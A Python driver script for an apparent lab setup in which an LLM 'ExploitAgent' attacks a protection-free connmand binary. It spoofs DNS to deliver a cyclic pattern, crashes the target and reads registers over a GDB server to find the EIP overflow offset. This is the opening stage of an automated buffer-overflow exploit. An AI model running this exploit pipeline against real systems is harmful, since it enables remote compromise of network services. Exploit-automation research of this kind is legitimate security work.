# main.py
import os
import time
import json
import socket
import subprocess
import argparse
from dotenv import load_dotenv
from agent import ExploitAgent

load_dotenv()

TARGET_HOST = 'target'
TARGET_PORT = 8080

class GDBClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        for i in range(15): # Try to connect for 15 seconds
            try:
                self.sock.connect((self.host, self.port))
                print("Connected to GDB MCP Server.")
                return
            except ConnectionRefusedError:
                time.sleep(1)
        raise ConnectionRefusedError("Could not connect to GDB server after multiple attempts.")

    def send_command(self, method, params=None):
        if not self.sock:
            self.connect()
        request = {"jsonrpc": "2.0", "method": method, "params": params or {}, "id": 1}
        self.sock.sendall(json.dumps(request).encode())
        response_data = self.sock.recv(4096)
        return json.loads(response_data.decode())

    def close(self):
        if self.sock:
            self.sock.close()

def main(target_binary, aslr_mode):
    print(f"***** AGENT STARTING EXPLOIT AGAINST: {target_binary} (ASLR: {aslr_mode.upper()}) *****")

    agent = ExploitAgent(model_name="openai/gpt-4o")
    gdb_client = GDBClient(TARGET_HOST, TARGET_PORT)

    try:
        # --- PHASE 1: Find Offset ---
        print("\n--- 🚀 PHASE 1: Finding EIP Offset ---")
        gdb_client.connect()
        
        # 1. Generate a unique pattern
        pattern = agent.generate_cyclic_pattern(1200)
        print(f"Generated a {len(pattern)}-byte cyclic pattern.")

        # 2. Start the DNS spoofer in the background to send the payload
        dns_spoofer_process = subprocess.Popen(['python3', 'dns_spoofer.py', '--payload', pattern.encode().hex()])
        time.sleep(1) # Give it a moment to start listening

        # 3. Trigger the DNS lookup that will crash the target
        print("Triggering the exploit...")
        subprocess.run(['dig', '@127.0.0.1', 'dos.com'], capture_output=True, check=False)
        
        # 4. Ask the GDB server to run the program and report the crash
        print("Waiting for crash report from GDB...")
        crash_info = gdb_client.send_command('run_and_get_crash_registers')
        
        if crash_info.get("status") == "crashed":
            print("Crash confirmed. Analyzing registers...")
            offset = agent.analyze_crash_and_get_offset(crash_info)
            print(f"--- ✅ SUCCESS: Agent determined offset is: {offset} ---")
        else:
            print("--- ❌ FAILED: Program did not crash as expected. ---")
            print(f"GDB Server Response: {crash_info}")

        dns_spoofer_process.kill()

    except Exception as e:
        print(f"An error occurred during the exploit run: {e}")
    finally:
        gdb_client.close()
        print("\n🎉 Exploit sequence finished.")

if __name__ == "__main__":
    # The argparse logic is now in configure_run.py
    # We read the config set by docker-compose
    target = os.getenv("TARGET_BINARY", "connmand_no_sec")
    aslr = "on" if os.getenv("ASLR_SETTING", "2") == "2" else "off"
    main(target, aslr)